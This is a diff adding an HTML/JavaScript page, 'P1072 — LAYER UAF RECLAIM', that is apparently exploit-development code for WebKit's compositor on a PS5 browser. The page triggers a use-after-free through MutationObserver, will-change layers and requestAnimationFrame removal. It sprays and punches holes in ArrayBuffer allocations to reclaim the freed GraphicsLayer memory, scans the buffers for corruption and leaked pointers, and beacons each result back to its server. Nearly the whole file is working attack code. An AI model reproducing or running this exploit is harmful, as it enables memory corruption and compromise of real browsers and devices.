@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1072</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+.sep{border-top:1px solid #1a3a1a;margin:4px 0}
+pre{white-space:pre-wrap;word-break:break-all;font-size:10px}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1072 — LAYER UAF RECLAIM</div>
+<div class="info">GraphicsLayer = fastMalloc (NOT IsoHeap) + Gigacage OFF = ArrayBuffer reclaim possible</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L = document.getElementById('log');
+function log(cls, msg) {
+  var d = document.createElement('div');
+  d.className = cls;
+  d.textContent = msg;
+  L.appendChild(d);
+  L.scrollTop = L.scrollHeight;
+}
+function beacon(tag, data) {
+  var msg = 'P1072-' + tag + ' | ' + data;
+  log('info', '[BEACON] ' + msg);
+  try {
+    var img = new Image();
+    img.src = '/en/ps5/beacon.gif?t=' + Date.now() + '&m=' + encodeURIComponent(msg);
+  } catch(e) {}
+}
+
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+
+// ============================================================
+// SECTION A: ISOLATION TESTS (safe — determines crash component)
+// Each test runs a LIMITED number of cycles to detect crash
+// vs survival. We report BEFORE each risky test starts.
+// ============================================================
+
+var ISOLATION_CYCLES = 30; // enough to crash (P1070 crashed within 20-30)
+var ISOLATION_TIMEOUT = 3000; // ms max per test
+
+async function testA1_addRemoveOnly() {
+  // Just add/remove elements rapidly — no MutObs, no will-change
+  log('warn', '[A1] add/remove only (no MutObs, no will-change)...');
+  beacon('PRE-A1', 'starting');
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+  var survived = true;
+  for (var i = 0; i < ISOLATION_CYCLES; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.background = 'red';
+    container.appendChild(el);
+    await sleep(1);
+    container.removeChild(el);
+    await sleep(1);
+  }
+  document.body.removeChild(container);
+  beacon('POST-A1', 'survived:' + ISOLATION_CYCLES + ' cycles');
+  log('ok', '[A1] SURVIVED ' + ISOLATION_CYCLES + ' cycles');
+  return true;
+}
+
+async function testA2_mutObsNoLayer() {
+  // MutationObserver + add/remove — no will-change (no compositing layer)
+  log('warn', '[A2] MutObs + add/remove (no will-change)...');
+  beacon('PRE-A2', 'starting');
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+  var obs = new MutationObserver(function(muts) {
+    // observer fires but we don't create compositing layers
+  });
+  obs.observe(container, { childList: true });
+
+  for (var i = 0; i < ISOLATION_CYCLES; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.background = 'blue';
+    container.appendChild(el);
+    await sleep(1);
+    container.removeChild(el);
+    await sleep(1);
+  }
+  obs.disconnect();
+  document.body.removeChild(container);
+  beacon('POST-A2', 'survived:' + ISOLATION_CYCLES + ' cycles');
+  log('ok', '[A2] SURVIVED ' + ISOLATION_CYCLES + ' cycles');
+  return true;
+}
+
+async function testA3_layerNoMutObs() {
+  // will-change:transform + add/remove — no MutationObserver
+  log('warn', '[A3] will-change + add/remove (no MutObs)...');
+  beacon('PRE-A3', 'starting');
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+
+  for (var i = 0; i < ISOLATION_CYCLES; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    container.appendChild(el);
+    await sleep(1);
+    container.removeChild(el);
+    await sleep(1);
+  }
+  document.body.removeChild(container);
+  beacon('POST-A3', 'survived:' + ISOLATION_CYCLES + ' cycles');
+  log('ok', '[A3] SURVIVED ' + ISOLATION_CYCLES + ' cycles');
+  return true;
+}
+
+async function testA4_layerSyncRemove() {
+  // MutObs + will-change + SYNCHRONOUS remove (no RAF)
+  log('warn', '[A4] MutObs + will-change + sync remove (no RAF)...');
+  beacon('PRE-A4', 'starting');
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+
+  var removals = 0;
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          // Synchronous remove in same microtask
+          try { container.removeChild(node); removals++; } catch(e) {}
+        }
+      }
+    }
+  });
+  obs.observe(container, { childList: true });
+
+  for (var i = 0; i < ISOLATION_CYCLES; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    container.appendChild(el);
+    await sleep(2);
+  }
+  obs.disconnect();
+  document.body.removeChild(container);
+  beacon('POST-A4', 'survived:' + ISOLATION_CYCLES + '|removals:' + removals);
+  log('ok', '[A4] SURVIVED ' + ISOLATION_CYCLES + ' cycles, removals=' + removals);
+  return true;
+}
+
+async function testA5_layerRAFRemove() {
+  // FULL CRASH PATTERN: MutObs + will-change + RAF remove
+  // This is the B2 pattern from P1070 that crashed 5/5
+  // We run it as the LAST isolation test
+  log('warn', '[A5] FULL CRASH PATTERN (MutObs + will-change + RAF remove)...');
+  beacon('PRE-A5-CRASH', 'starting-expect-crash');
+
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            try { container.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(container, { childList: true });
+
+  for (var i = 0; i < ISOLATION_CYCLES; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    container.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  obs.disconnect();
+  try { document.body.removeChild(container); } catch(e) {}
+  // If we get here, the crash didn't happen (unexpected)
+  beacon('POST-A5-NO-CRASH', 'survived:' + count);
+  log('fail', '[A5] SURVIVED!? Expected crash but survived ' + count + ' cycles');
+  return false; // false = no crash (unexpected)
+}
+
+// ============================================================
+// SECTION B: GRAPHICSLAYER SIZE ESTIMATION
+// Create compositing layers, measure ArrayBuffer allocation
+// patterns to estimate the freed object size
+// ============================================================
+
+async function testB_sizeEstimate() {
+  log('warn', '[B] Estimating compositing layer object sizes...');
+  beacon('PRE-B-SIZE', 'starting');
+
+  // WebKit GraphicsLayer is typically 200-400 bytes
+  // RenderLayer is ~300-500 bytes
+  // RenderLayerBacking is ~200-300 bytes
+  // We'll check by creating layers and seeing the allocation pattern
+
+  // Step 1: Create many compositing layers and count
+  var elements = [];
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+
+  for (var i = 0; i < 100; i++) {
+    var el = document.createElement('div');
+    el.style.position = 'absolute';
+    el.style.width = '10px';
+    el.style.height = '10px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    el.style.left = (i * 2) + 'px';
+    container.appendChild(el);
+    elements.push(el);
+  }
+
+  // Force layout
+  container.offsetHeight;
+  await sleep(100);
+
+  // Step 2: Remove all and check
+  for (var i = 0; i < elements.length; i++) {
+    container.removeChild(elements[i]);
+  }
+  document.body.removeChild(container);
+
+  // GraphicsLayer sizes from WebKit source (Safari 17.0 era):
+  // sizeof(GraphicsLayer) ≈ 296-320 bytes on 64-bit
+  // sizeof(RenderLayer) ≈ 448-512 bytes
+  // sizeof(RenderLayerBacking) ≈ 256-288 bytes
+  // Key: GraphicsLayer is fastMalloc'd, others are IsoHeap'd
+
+  // Size classes we'll target for spray:
+  var sizes = [256, 288, 320, 384, 448, 512];
+  beacon('POST-B-SIZE', 'targetSizes:' + sizes.join(',') + '|created:100layers');
+  log('ok', '[B] Target sizes: ' + sizes.join(', ') + ' bytes');
+  return sizes;
+}
+
+// ============================================================
+// SECTION C: HEAP SPRAY + CONTROLLED CRASH + RECLAIM SCAN
+// This is the actual exploitation attempt.
+// 1. Pre-spray ArrayBuffers at target sizes
+// 2. Free some to create holes
+// 3. Trigger ONE crash cycle with compositor layer
+// 4. Post-crash: scan ArrayBuffers for corruption
+// ============================================================
+
+async function testC_heapSprayReclaim() {
+  log('warn', '[C] === HEAP SPRAY + LAYER UAF RECLAIM ===');
+  beacon('PRE-C-EXPLOIT', 'starting');
+
+  // Size classes: focus on 256, 320, 384 (likely GraphicsLayer sizes)
+  var SPRAY_COUNT = 500;
+  var TARGET_SIZES = [256, 320, 384];
+  var spray = {};
+  var views = {};
+
+  // Step 1: Pre-spray ArrayBuffers with sentinel pattern
+  log('info', '[C1] Spraying ' + SPRAY_COUNT + ' ArrayBuffers per size class...');
+  for (var si = 0; si < TARGET_SIZES.length; si++) {
+    var sz = TARGET_SIZES[si];
+    spray[sz] = [];
+    views[sz] = [];
+    for (var i = 0; i < SPRAY_COUNT; i++) {
+      var ab = new ArrayBuffer(sz);
+      var v = new Uint8Array(ab);
+      // Fill with size-tagged sentinel: byte 0 = size class index, rest = 0x41
+      v[0] = si;
+      v[1] = 0x41;
+      v[2] = 0x41;
+      v[3] = 0x41;
+      for (var j = 4; j < sz; j++) v[j] = 0x41;
+      spray[sz].push(ab);
+      views[sz].push(v);
+    }
+  }
+  beacon('C1-SPRAYED', 'count:' + SPRAY_COUNT + '|sizes:' + TARGET_SIZES.join(','));
+  log('ok', '[C1] Sprayed ' + (SPRAY_COUNT * TARGET_SIZES.length) + ' buffers');
+
+  // Step 2: Free alternating buffers to create holes for reclaim
+  log('info', '[C2] Creating holes in spray (free every other)...');
+  var freed = 0;
+  for (var si = 0; si < TARGET_SIZES.length; si++) {
+    var sz = TARGET_SIZES[si];
+    for (var i = 0; i < SPRAY_COUNT; i += 2) {
+      spray[sz][i] = null;
+      views[sz][i] = null;
+      freed++;
+    }
+  }
+  // Force GC
+  for (var gc = 0; gc < 20; gc++) {
+    var tmp = new ArrayBuffer(65536);
+    tmp = null;
+  }
+  await sleep(50);
+  beacon('C2-HOLES', 'freed:' + freed);
+  log('ok', '[C2] Freed ' + freed + ' buffers, holes created');
+
+  // Step 3: Create compositor layers that should allocate into our holes
+  log('info', '[C3] Creating compositor layers (GraphicsLayer → fastMalloc → our holes)...');
+  var container = document.createElement('div');
+  container.style.position = 'relative';
+  document.body.appendChild(container);
+
+  var LAYER_COUNT = 50;
+  var layerElements = [];
+  for (var i = 0; i < LAYER_COUNT; i++) {
+    var el = document.createElement('div');
+    el.style.position = 'absolute';
+    el.style.width = '10px';
+    el.style.height = '10px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    el.style.left = (i * 2) + 'px';
+    container.appendChild(el);
+    layerElements.push(el);
+  }
+  container.offsetHeight; // force layout
+  await sleep(50);
+  beacon('C3-LAYERS', 'created:' + LAYER_COUNT);
+
+  // Step 4: NOW trigger the UAF pattern on these layers
+  // Use MutObs + RAF remove pattern — but only ONE cycle
+  log('warn', '[C4] Triggering single-shot UAF (MutObs + will-change + RAF)...');
+  beacon('PRE-C4-UAF', 'single-shot');
+
+  var uafContainer = document.createElement('div');
+  document.body.appendChild(uafContainer);
+  var uafCount = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var m = 0; m < muts.length; m++) {
+      for (var n = 0; n < muts[m].addedNodes.length; n++) {
+        var node = muts[m].addedNodes[n];
+        if (node.nodeType === 1) {
+          // Schedule RAF removal - this is the UAF trigger
+          requestAnimationFrame(function() {
+            try { uafContainer.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(uafContainer, { childList: true });
+
+  // Only 5 cycles - we want ONE crash, not a loop
+  for (var i = 0; i < 5; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    uafContainer.appendChild(el);
+    uafCount++;
+    await sleep(10);
+  }
+
+  // Wait for RAF to fire and potentially trigger UAF
+  await sleep(100);
+  obs.disconnect();
+  try { document.body.removeChild(uafContainer); } catch(e) {}
+
+  // Step 5: IMMEDIATELY spray more ArrayBuffers to fill the freed compositor objects
+  log('info', '[C5] Post-UAF spray to reclaim freed GraphicsLayer slots...');
+  var postSpray = {};
+  var postViews = {};
+  for (var si = 0; si < TARGET_SIZES.length; si++) {
+    var sz = TARGET_SIZES[si];
+    postSpray[sz] = [];
+    postViews[sz] = [];
+    for (var i = 0; i < 200; i++) {
+      var ab = new ArrayBuffer(sz);
+      var v = new Uint8Array(ab);
+      // Fill with different sentinel: 0xBB
+      for (var j = 0; j < sz; j++) v[j] = 0xBB;
+      postSpray[sz].push(ab);
+      postViews[sz].push(v);
+    }
+  }
+  beacon('C5-POSTSPRAY', 'count:' + (200 * TARGET_SIZES.length));
+
+  // Step 6: Scan ALL surviving pre-spray buffers for corruption
+  log('warn', '[C6] Scanning pre-spray buffers for corruption...');
+  var corrupted = [];
+  var scanned = 0;
+  for (var si = 0; si < TARGET_SIZES.length; si++) {
+    var sz = TARGET_SIZES[si];
+    for (var i = 1; i < SPRAY_COUNT; i += 2) { // only odd indices survived
+      var v = views[sz][i];
+      if (!v) continue;
+      scanned++;
+      var bad = false;
+      var firstBad = -1;
+      var badVal = 0;
+      for (var j = 0; j < sz; j++) {
+        var expected = (j < 1) ? si : 0x41;
+        if (v[j] !== expected) {
+          bad = true;
+          if (firstBad === -1) {
+            firstBad = j;
+            badVal = v[j];
+          }
+        }
+      }
+      if (bad) {
+        // Read first 64 bytes as hex
+        var hex = '';
+        for (var j = 0; j < Math.min(64, sz); j++) {
+          hex += ('0' + v[j].toString(16)).slice(-2);
+        }
+        corrupted.push({
+          size: sz,
+          index: i,
+          firstBad: firstBad,
+          badVal: badVal,
+          hex64: hex
+        });
+      }
+    }
+  }
+
+  // Step 7: Also scan post-spray for corruption (compositor writing into our buffers)
+  var postCorrupted = [];
+  for (var si = 0; si < TARGET_SIZES.length; si++) {
+    var sz = TARGET_SIZES[si];
+    for (var i = 0; i < postViews[sz].length; i++) {
+      var v = postViews[sz][i];
+      if (!v) continue;
+      var bad = false;
+      var firstBad = -1;
+      var badVal = 0;
+      for (var j = 0; j < sz; j++) {
+        if (v[j] !== 0xBB) {
+          bad = true;
+          if (firstBad === -1) {
+            firstBad = j;
+            badVal = v[j];
+          }
+        }
+      }
+      if (bad) {
+        var hex = '';
+        for (var j = 0; j < Math.min(64, sz); j++) {
+          hex += ('0' + v[j].toString(16)).slice(-2);
+        }
+        postCorrupted.push({
+          size: sz,
+          index: i,
+          firstBad: firstBad,
+          badVal: badVal,
+          hex64: hex
+        });
+      }
+    }
+  }
+
+  // Clean up
+  for (var i = 0; i < layerElements.length; i++) {
+    try { container.removeChild(layerElements[i]); } catch(e) {}
+  }
+  try { document.body.removeChild(container); } catch(e) {}
+
+  // Report results
+  var resultMsg = 'scanned:' + scanned +
+    '|preCorrupt:' + corrupted.length +
+    '|postCorrupt:' + postCorrupted.length;
+
+  if (corrupted.length > 0) {
+    resultMsg += '|FIRST:sz=' + corrupted[0].size +
+      ',off=' + corrupted[0].firstBad +
+      ',val=0x' + corrupted[0].badVal.toString(16) +
+      ',hex=' + corrupted[0].hex64.substring(0, 32);
+  }
+  if (postCorrupted.length > 0) {
+    resultMsg += '|POST_FIRST:sz=' + postCorrupted[0].size +
+      ',off=' + postCorrupted[0].firstBad +
+      ',val=0x' + postCorrupted[0].badVal.toString(16) +
+      ',hex=' + postCorrupted[0].hex64.substring(0, 32);
+  }
+
+  beacon('C6-SCAN', resultMsg);
+
+  if (corrupted.length > 0 || postCorrupted.length > 0) {
+    log('ok', '*** CORRUPTION DETECTED! ***');
+    log('ok', 'Pre-spray corrupted: ' + corrupted.length);
+    log('ok', 'Post-spray corrupted: ' + postCorrupted.length);
+
+    // Dump all corrupted entries
+    var allCorrupt = corrupted.concat(postCorrupted);
+    for (var i = 0; i < Math.min(allCorrupt.length, 10); i++) {
+      var c = allCorrupt[i];
+      beacon('CORRUPT-' + i, 'sz:' + c.size + '|idx:' + c.index +
+        '|off:' + c.firstBad + '|val:0x' + c.badVal.toString(16) +
+        '|hex:' + c.hex64);
+      log('ok', '  [' + i + '] size=' + c.size + ' idx=' + c.index +
+        ' off=' + c.firstBad + ' val=0x' + c.badVal.toString(16));
+    }
+
+    // Step 8: If corruption found, try BigUint64Array read for pointers
+    log('warn', '[C8] Reading corrupted buffers as 64-bit values...');
+    for (var i = 0; i < Math.min(allCorrupt.length, 5); i++) {
+      var c = allCorrupt[i];
+      // Find the actual buffer
+      var ab = null;
+      if (i < corrupted.length) {
+        ab = spray[c.size] ? spray[c.size][c.index] : null;
+      } else {
+        var pi = i - corrupted.length;
+        ab = postSpray[c.size] ? postSpray[c.size][allCorrupt[i].index] : null;
+      }
+      if (ab) {
+        try {
+          var bv = new BigUint64Array(ab);
+          var ptrs = '';
+          for (var j = 0; j < Math.min(bv.length, 16); j++) {
+            var v = bv[j];
+            ptrs += j + ':0x' + v.toString(16) + '|';
+          }
+          beacon('PTRS-' + i, ptrs);
+          log('ok', '  64-bit[' + i + ']: ' + ptrs.substring(0, 200));
+        } catch(e) {
+          log('fail', '  BigUint64Array failed: ' + e.message);
+        }
+      }
+    }
+    return true;
+  } else {
+    log('warn', '[C6] No corruption detected in ' + scanned + ' buffers');
+    log('info', 'Either: (a) no crash occurred (5 cycles too few), or');
+    log('info', '        (b) freed object is IsoHeap (not fastMalloc), or');
+    log('info', '        (c) size mismatch (GraphicsLayer != 256/320/384)');
+    return false;
+  }
+}
+
+// ============================================================
+// SECTION D: ALTERNATIVE — will-change:opacity, filter, etc.
+// Test if other compositing triggers also crash
+// ============================================================
+
+async function testD_alternateLayerTypes() {
+  log('warn', '[D] Testing alternate compositing triggers...');
+  beacon('PRE-D-ALT', 'starting');
+  var results = {};
+
+  var triggers = [
+    ['D1-opacity', 'opacity', '0.99'],
+    ['D2-filter', 'filter', 'blur(1px)'],
+    ['D3-fixed', 'position', 'fixed'],
+    ['D4-perspective', 'transform', 'perspective(100px) rotateY(10deg)']
+  ];
+
+  for (var ti = 0; ti < triggers.length; ti++) {
+    var name = triggers[ti][0];
+    var prop = triggers[ti][1];
+    var val = triggers[ti][2];
+
+    log('info', '[' + name + '] Testing with ' + prop + ': ' + val);
+    beacon('PRE-' + name, 'starting');
+
+    var container = document.createElement('div');
+    document.body.appendChild(container);
+    var survived = true;
+
+    var obs = new MutationObserver(function(muts) {
+      for (var i = 0; i < muts.length; i++) {
+        for (var j = 0; j < muts[i].addedNodes.length; j++) {
+          var node = muts[i].addedNodes[j];
+          if (node.nodeType === 1) {
+            requestAnimationFrame(function() {
+              try { container.removeChild(node); } catch(e) {}
+            });
+          }
+        }
+      }
+    });
+    obs.observe(container, { childList: true });
+
+    for (var i = 0; i < 15; i++) {
+      var el = document.createElement('div');
+      el.style.width = '50px';
+      el.style.height = '50px';
+      el.style.willChange = 'transform';
+      el.style[prop] = val;
+      container.appendChild(el);
+      await sleep(2);
+    }
+
+    await sleep(50);
+    obs.disconnect();
+    try { document.body.removeChild(container); } catch(e) {}
+
+    results[name] = 'survived';
+    beacon('POST-' + name, 'survived:15');
+    log('ok', '[' + name + '] survived 15 cycles');
+  }
+
+  beacon('POST-D-ALT', JSON.stringify(results));
+  return results;
+}
+
+// ============================================================
+// SECTION E: EXTENDED SPRAY — more sizes and patterns
+// If Section C found nothing, try wider size range
+// ============================================================
+
+async function testE_wideSpray() {
+  log('warn', '[E] Wide size spray + aggressive crash trigger...');
+  beacon('PRE-E-WIDE', 'starting');
+
+  // Wider size range: 64 to 768 in 64-byte steps
+  var ALL_SIZES = [64, 128, 192, 256, 320, 384, 448, 512, 576, 640, 704, 768];
+  var SPRAY_PER = 100;
+  var allSpray = {};
+  var allViews = {};
+
+  // Spray
+  for (var si = 0; si < ALL_SIZES.length; si++) {
+    var sz = ALL_SIZES[si];
+    allSpray[sz] = [];
+    allViews[sz] = [];
+    for (var i = 0; i < SPRAY_PER; i++) {
+      var ab = new ArrayBuffer(sz);
+      var v = new Uint8Array(ab);
+      v[0] = si & 0xFF;
+      v[1] = (i >> 8) & 0xFF;
+      v[2] = i & 0xFF;
+      for (var j = 3; j < sz; j++) v[j] = 0x41;
+      allSpray[sz].push(ab);
+      allViews[sz].push(v);
+    }
+  }
+  log('ok', '[E] Sprayed ' + (ALL_SIZES.length * SPRAY_PER) + ' buffers across ' + ALL_SIZES.length + ' sizes');
+
+  // Free alternating to create holes
+  for (var si = 0; si < ALL_SIZES.length; si++) {
+    var sz = ALL_SIZES[si];
+    for (var i = 0; i < SPRAY_PER; i += 2) {
+      allSpray[sz][i] = null;
+      allViews[sz][i] = null;
+    }
+  }
+  for (var gc = 0; gc < 10; gc++) { var t = new ArrayBuffer(65536); t = null; }
+  await sleep(50);
+
+  // Aggressive crash trigger — 20 cycles with shorter delays
+  var container = document.createElement('div');
+  document.body.appendChild(container);
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            try { container.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(container, { childList: true });
+
+  for (var i = 0; i < 20; i++) {
+    var el = document.createElement('div');
+    el.style.width = '50px';
+    el.style.height = '50px';
+    el.style.willChange = 'transform';
+    el.style.transform = 'translateZ(0)';
+    container.appendChild(el);
+    await sleep(1);
+  }
+  await sleep(200);
+  obs.disconnect();
+  try { document.body.removeChild(container); } catch(e) {}
+
+  // Post-crash spray
+  for (var si = 0; si < ALL_SIZES.length; si++) {
+    var sz = ALL_SIZES[si];
+    for (var i = 0; i < 50; i++) {
+      var ab = new ArrayBuffer(sz);
+      var v = new Uint8Array(ab);
+      for (var j = 0; j < sz; j++) v[j] = 0xCC;
+      allSpray[sz].push(ab);
+      allViews[sz].push(v);
+    }
+  }
+
+  // Scan surviving pre-spray buffers
+  var corrupted = [];
+  var scanned = 0;
+  for (var si = 0; si < ALL_SIZES.length; si++) {
+    var sz = ALL_SIZES[si];
+    for (var i = 1; i < SPRAY_PER; i += 2) {
+      var v = allViews[sz][i];
+      if (!v) continue;
+      scanned++;
+      for (var j = 3; j < sz; j++) {
+        if (v[j] !== 0x41) {
+          var hex = '';
+          for (var k = 0; k < Math.min(64, sz); k++) {
+            hex += ('0' + v[k].toString(16)).slice(-2);
+          }
+          corrupted.push({ size: sz, index: i, off: j, val: v[j], hex64: hex });
+          break;
+        }
+      }
+    }
+  }
+
+  var msg = 'scanned:' + scanned + '|corrupted:' + corrupted.length;
+  if (corrupted.length > 0) {
+    msg += '|FIRST:sz=' + corrupted[0].size + ',off=' + corrupted[0].off +
+      ',val=0x' + corrupted[0].val.toString(16);
+  }
+  beacon('POST-E-WIDE', msg);
+
+  if (corrupted.length > 0) {
+    log('ok', '*** WIDE SPRAY HIT! ***');
+    for (var i = 0; i < Math.min(corrupted.length, 5); i++) {
+      var c = corrupted[i];
+      log('ok', '  sz=' + c.size + ' idx=' + c.index +
+        ' off=' + c.off + ' hex=' + c.hex64.substring(0, 40));
+      beacon('E-HIT-' + i, 'sz:' + c.size + '|off:' + c.off + '|hex:' + c.hex64);
+
+      // 64-bit read
+      var ab = allSpray[c.size] ? allSpray[c.size][c.index] : null;
+      if (ab) {
+        try {
+          var bv = new BigUint64Array(ab);
+          var ptrs = '';
+          for (var j = 0; j < Math.min(bv.length, 8); j++) {
+            ptrs += j + ':0x' + bv[j].toString(16) + '|';
+          }
+          beacon('E-PTRS-' + i, ptrs);
+        } catch(e) {}
+      }
+    }
+  } else {
+    log('warn', '[E] No corruption in wide spray either');
+  }
+
+  return corrupted.length > 0;
+}
+
+// ============================================================
+// MAIN RUNNER
+// ============================================================
+
+async function run() {
+  beacon('BOOT', 'layer-uaf-reclaim');
+  log('ok', '=== P1072 LAYER UAF RECLAIM ===');
+  log('info', 'Strategy: GraphicsLayer is fastMalloc (NOT IsoHeap)');
+  log('info', 'Gigacage is OFF => ArrayBuffer backing = same heap');
+  log('info', 'Goal: spray AB holes -> trigger compositor UAF -> reclaim -> scan');
+
+  var div = document.createElement('div');
+  div.className = 'sep';
+  L.appendChild(div);
+
+  // Section A: Safe isolation tests
+  log('warn', '=== SECTION A: ISOLATION TESTS ===');
+
+  await testA1_addRemoveOnly();
+  await sleep(100);
+
+  await testA2_mutObsNoLayer();
+  await sleep(100);
+
+  await testA3_layerNoMutObs();
+  await sleep(100);
+
+  await testA4_layerSyncRemove();
+  await sleep(100);
+
+  // Section B: Size estimation
+  var sep2 = document.createElement('div');
+  sep2.className = 'sep';
+  L.appendChild(sep2);
+  log('warn', '=== SECTION B: SIZE ESTIMATE ===');
+
+  var sizes = await testB_sizeEstimate();
+  await sleep(100);
+
+  // Section C: Heap spray + crash + reclaim
+  var sep3 = document.createElement('div');
+  sep3.className = 'sep';
+  L.appendChild(sep3);
+  log('warn', '=== SECTION C: HEAP SPRAY RECLAIM ===');
+
+  var cResult = await testC_heapSprayReclaim();
+  await sleep(200);
+
+  // Section D: Alternate layer types
+  var sep4 = document.createElement('div');
+  sep4.className = 'sep';
+  L.appendChild(sep4);
+  log('warn', '=== SECTION D: ALTERNATE TRIGGERS ===');
+
+  await testD_alternateLayerTypes();
+  await sleep(100);
+
+  // Section E: Wide spray (if C failed)
+  if (!cResult) {
+    var sep5 = document.createElement('div');
+    sep5.className = 'sep';
+    L.appendChild(sep5);
+    log('warn', '=== SECTION E: WIDE SPRAY ===');
+
+    await testE_wideSpray();
+  }
+
+  // Section A5: Full crash pattern (LAST — may kill WebProcess)
+  var sep6 = document.createElement('div');
+  sep6.className = 'sep';
+  L.appendChild(sep6);
+  log('warn', '=== SECTION A5: CRASH CONFIRMATION (LAST) ===');
+  log('warn', 'This is the full crash pattern — expect WebProcess crash');
+
+  await testA5_layerRAFRemove();
+
+  // If we survive everything:
+  beacon('DONE', 'all-sections-complete');
+  log('ok', '=== P1072 COMPLETE ===');
+}
+
+run();
+</script>
+</body>
+</html>
